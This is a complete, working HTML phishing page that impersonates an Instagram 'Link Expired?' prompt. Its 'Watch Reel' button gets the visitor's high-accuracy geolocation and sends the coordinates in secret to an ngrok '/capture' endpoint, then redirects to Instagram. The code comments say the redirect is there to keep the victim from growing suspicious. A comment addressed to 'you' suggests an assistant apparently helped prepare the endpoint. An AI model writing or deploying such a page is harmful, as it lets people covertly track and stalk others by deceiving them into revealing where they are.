<!DOCTYPE html>
<html>
<head>
    <title>Secure Connection</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: -apple-system, sans-serif;
        }
        .container { text-align: center; padding: 20px; }
        .btn {
            background: linear-gradient(45deg, #f09433 0%, #e1306c 25%, #c13584 50%, #833ab4 75%, #5851db 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="60" style="margin-bottom: 20px;">
        <h2>Link Expired?</h2>
        <p>To view this Reel, please verify your secure connection.</p>
        
        <button class="btn" onclick="getLocation()">Watch Reel</button>
    </div>

    <script>
        function getLocation() {
            // Updating the status so the user thinks something is happening
            document.querySelector('h2').innerText = "Verifying...";
            
            if (navigator.geolocation) {
                // High accuracy helps, but might take a second longer
                navigator.geolocation.getCurrentPosition(sendData, showError, {enableHighAccuracy: true});
            } else {
                alert("Sir, your browser is unfortunately outdated.");
                window.location.href = "https://www.google.com";
            }
        }

        function sendData(position) {
            // CRITICAL: I have cleaned the URL for you. Do NOT add arrows or localhost here.
            const url = "https://kathi-lated-originatively.ngrok-free.dev/capture";
            
            fetch(url, {
                method: "POST",
                mode: 'cors', 
                headers: { 
                    "Content-Type": "application/json",
                    "ngrok-skip-browser-warning": "true" 
                },
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                })
            })
            .then(() => {
                window.location.href = "https://www.instagram.com/reels/";
            })
            .catch(err => {
                window.location.href = "https://www.instagram.com/reels/";
            });
        }

        function showError(error) {
            // Even if they deny, we send them to Instagram to avoid suspicion
            window.location.href = "https://www.instagram.com/reels/";
        }
    </script>
</body>
</html>
